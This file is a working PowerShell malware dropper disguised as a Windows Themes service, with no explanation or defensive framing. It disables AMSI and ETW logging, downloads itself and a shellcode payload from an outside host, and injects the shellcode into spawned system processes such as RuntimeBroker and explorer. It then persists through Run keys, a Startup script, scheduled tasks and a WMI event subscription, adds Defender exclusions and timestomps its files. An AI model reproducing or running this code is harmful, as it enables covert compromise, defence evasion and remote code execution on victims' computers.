$CFG = @{
  URL   = 'security.fixarestudio.com/HEAD_DEMAND.bin'
  SELF  = 'security.fixarestudio.com/dropper.ps1'
  B64   = 'auto'
  TAG   = 'WinThemeSvc'
  DIR   = "$env:APPDATA\Microsoft\Windows\Themes\themesvc"
  WATCH = 10
  DIE   = '20501231'
}

$ErrorActionPreference='SilentlyContinue'
$D=$CFG.DIR; $T=$CFG.TAG; $L="$D\l.ps1"; $V="$D\v.vbs"; $PF="$D\host.pid"; $LOG="$D\d.log"
if(-not(Test-Path $D)){New-Item -ItemType Directory -Force -Path $D|Out-Null}
function Log($m){ "$(Get-Date -f 'MM-dd HH:mm:ss') $m" | Add-Content $LOG }

if([int](Get-Date -f yyyyMMdd) -gt [int]$CFG.DIE){ Log 'killswitch'; exit }
[Net.ServicePointManager]::SecurityProtocol = 3072

try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
 GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); Log 'amsi ok'}catch{Log 'amsi fail'}

Add-Type -Language CSharp -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class Inj{
 [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr OpenProcess(uint a,bool i,int p);
 [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
 [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);
 [DllImport("kernel32.dll",SetLastError=true)] public static extern bool VirtualProtectEx(IntPtr h,IntPtr a,UIntPtr s,uint n,out uint o);
 [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr id);
 [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
 [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m,string n);
 [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
 public static void Etw(){
  IntPtr h=GetModuleHandle("ntdll.dll");
  IntPtr p=GetProcAddress(h,"EtwEventWrite");
  uint o; VirtualProtect(p,(UIntPtr)1,0x40,out o);
  Marshal.WriteByte(p,0xC3);
  VirtualProtect(p,(UIntPtr)1,o,out o);
 }
 public static int Fire(string exe,byte[] sc){
  var pr=Process.Start(new ProcessStartInfo(exe){UseShellExecute=false,CreateNoWindow=true});
  IntPtr h=OpenProcess(0x1F0FFF,false,pr.Id);
  IntPtr a=VirtualAllocEx(h,IntPtr.Zero,(uint)sc.Length,0x3000,0x04);
  UIntPtr w; WriteProcessMemory(h,a,sc,(uint)sc.Length,out w);
  uint o; VirtualProtectEx(h,a,(UIntPtr)sc.Length,0x20,out o);
  CreateRemoteThread(h,IntPtr.Zero,0,a,IntPtr.Zero,0,IntPtr.Zero);
  return pr.Id;
 }
}
'@
[Inj]::Etw(); Log 'etw patched'
if(-not [Environment]::Is64BitProcess){
  $x64 = Join-Path $env:SystemRoot 'Sysnative\WindowsPowerShell\v1.0\powershell.exe'
  (New-Object Net.WebClient).DownloadFile($CFG.SELF, $L)
  Start-Process $x64 -ArgumentList '-nop','-w','h','-ep','b','-f',$L -WindowStyle Hidden
  Log 'relaunch x64'; exit
}

try{$mu=New-Object Threading.Mutex($false,"Global\$T")
 if(-not $mu.WaitOne(0)){Log 'dup exit'; exit}}catch{}

try{(New-Object Net.WebClient).DownloadFile($CFG.SELF,$L); Log 'self staged'}catch{Log 'self fail'}

$sc=$null
try{
  $wc=New-Object Net.WebClient
  if($CFG.B64 -eq $false){ $sc=$wc.DownloadData($CFG.URL); Log "raw $($sc.Length)b" }
  else{
    $s=$wc.DownloadString($CFG.URL)
    try{ $sc=[Convert]::FromBase64String(($s -replace '\s','')); Log "b64 $($sc.Length)b" }
    catch{ $sc=$wc.DownloadData($CFG.URL); Log "b64fail->raw $($sc.Length)b" }
  }
}catch{ Log 'fetch fail' }
if(-not $sc -or $sc.Length -lt 512){ Log 'bad payload'; exit }

function Persist{
  "CreateObject(`"WScript.Shell`").Run `"powershell -nop -w h -ep b -f `"$L`"`",0,False"|
    Set-Content $V -Encoding ASCII

  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name $T -Value "wscript.exe `"$V`"" -Force
  Copy-Item $V (Join-Path ([Environment]::GetFolderPath('Startup')) 'Windows Themes.vbs') -Force

  schtasks /create /tn "Microsoft\Windows\Themes\$T" /tr "wscript.exe `"$V`"" `
    /sc minute /mo $CFG.WATCH /f 2>$null|Out-Null
  schtasks /create /tn "Microsoft\Windows\Themes\${T}L" /tr "wscript.exe `"$V`"" `
    /sc onlogon /f 2>$null|Out-Null

  $q="SELECT * FROM __InstanceModificationEvent WITHIN 90 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  $f=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name="SM_$T"; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$q}
  $c=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name="SR_$T"; CommandLineTemplate="wscript.exe `"$V`""}
  Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$f; Consumer=$c} | Out-Null

  if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    Set-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' `
      -Name $T -Value "wscript.exe `"$V`"" -Force
    schtasks /create /tn "Microsoft\Windows\Themes\${T}S" /tr "wscript.exe `"$V`"" `
      /sc onstart /ru SYSTEM /f 2>$null|Out-Null
    Add-MpPreference -ExclusionPath $D 2>$null
    Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe' 2>$null
    Log 'elevated extras'
  }
  $ts=(Get-Item "$env:SystemRoot\System32\kernel32.dll").LastWriteTime
  Get-ChildItem $D|ForEach-Object{$_.CreationTime=$ts;$_.LastWriteTime=$ts}
}

$live=$false
if(Test-Path $PF){$hp=[int](Get-Content $PF); if(Get-Process -Id $hp -EA 0){$live=$true; Log "host $hp alive"}}

if(-not $live){
  foreach($c in @("$env:SystemRoot\System32\RuntimeBroker.exe",
                  "$env:SystemRoot\System32\dllhost.exe",
                  "$env:SystemRoot\explorer.exe")){
    $np=[Inj]::Fire($c,$sc)
    Start-Sleep -Milliseconds 1800
    if(Get-Process -Id $np -EA 0){$np|Set-Content $PF; Log "injected -> $([IO.Path]::GetFileName($c)) ($np)"; break}
    Log "dead: $c"
  }
}

Persist
Log 'done'
